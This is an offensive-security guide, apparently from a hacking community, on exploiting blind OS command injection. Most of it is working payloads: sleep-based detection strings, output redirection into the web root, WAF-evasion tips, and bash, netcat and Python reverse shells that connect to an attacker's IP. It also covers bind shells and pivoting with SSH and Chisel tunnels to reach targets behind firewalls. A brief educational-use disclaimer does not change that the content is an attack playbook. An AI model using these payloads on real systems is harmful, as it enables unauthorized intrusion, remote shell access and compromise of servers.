
# 🎩 Blind OS Command Injection: The Ultimate Mega-Guide

* 🚀 Created for Hack Tools Dark Community — Deep Offensive Security Knowledge*

---

## Contents
- [1. Basic Detection of Blind OS Command Injection](#1-basic-detection-of-blind-os-command-injection)
- [2. Output Redirection to Capture Command Results](#2-output-redirection-to-capture-command-results)
- [3. Elevating to Reverse Shells](#3-elevating-to-reverse-shells)
- [4. Using Bind Shells When Reverse Shells Fail](#4-using-bind-shells-when-reverse-shells-fail)
- [5. Bonus Pro Tip: Port Forwarding to Reach Hidden Bind Shells](#5-bonus-pro-tip-port-forwarding-to-reach-hidden-bind-shells)

---

## 1. Basic Detection of Blind OS Command Injection

Look for injectable points by submitting payloads that cause delays:

**Example Payloads:**
```bash
test@example.com & sleep 5 #
```
```bash
test@example.com | ping -c 5 127.0.0.1 #
```

**Success indicator:** The server response is delayed by about 5 seconds.

---

## 2. Output Redirection to Capture Command Results

**Step 1: Find a file-loading endpoint**
```bash
/image?filename=xyz
```

**Step 2: Inject payload to redirect command output**
```bash
xyz & whoami > /var/www/images/output.txt #
```

**Step 3: Retrieve output**
```bash
/image?filename=output.txt
```

**Tip:** Adapt filesystem paths according to the webserver setup.

**Filter Evasion Tricks:**
- Use `${IFS}` instead of spaces.
- Base64 encode payloads.
- Chain commands using `&&`, `|`, or backticks.
- Bypass WAF signatures with obfuscation.

---

## 3. Elevating to Reverse Shells

**Step 1: Start a listener**
```bash
nc -lvnp 4444
```

**Step 2: Inject reverse shell payload**

**Example Bash reverse shell:**
```bash
photo.png & bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 #
```

**Example Netcat reverse shell:**
```bash
photo.png & nc YOUR_IP 4444 -e /bin/bash #
```

**Example Python reverse shell:**
```bash
photo.png & python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("YOUR_IP",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);' #
```

**Shell Stabilization:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
reset
export TERM=xterm
```

---

## 4. Using Bind Shells When Reverse Shells Fail

When reverse shells are blocked, create a bind shell on the target.

**Bind shell payload with Netcat:**
```bash
photo.png & nc -nlvp 4444 -e /bin/bash #
```

Then connect from your machine:
```bash
nc TARGET_IP 4444
```

If bind shell only listens locally, proceed to Port Forwarding.

---

## 5. Bonus Pro Tip: Port Forwarding to Reach Hidden Bind Shells

If you can't reach the bind shell directly:

**Option 1: SSH port forwarding**
```bash
ssh -L 5555:localhost:4444 user@victim_ip
nc 127.0.0.1 5555
```

**Option 2: Chisel tunnel**
```bash
# On attacker:
chisel server -p 8000 --reverse

# On victim:
chisel client YOUR_IP:8000 R:5555:127.0.0.1:4444

# Connect:
nc 127.0.0.1 5555
```

**Result:** You gain shell access even behind NAT/firewall/internal networks!

---

## ⚠️ Disclaimer

This guide is intended for **educational purposes only**.  
Unauthorized testing or exploitation is illegal. Always have **explicit permission** before engaging in any security testing.

---

## 💬 Join the Ultimate Discussion!

Which command injection techniques, pivoting tricks, or shell payloads do you prefer?  
Share your expertise, custom payloads, and success stories with Hack Tools Dark Community!

---

## 📚 Recommended Resources
- [PortSwigger OS Command Injection Academy](https://portswigger.net/web-security/os-command-injection)
- [PayloadsAllTheThings - Command Injection Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HighOnCoffee - Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [HackTricks - Port Forwarding & Pivoting](https://book.hacktricks.xyz/network-services-pentesting/port-forwarding-and-pivoting)

---

#hacking #pentesting #bugbounty #cybersecurity #infosec #redteam #rce #bindshell #portforwarding #pivoting #commandinjection #websecurity
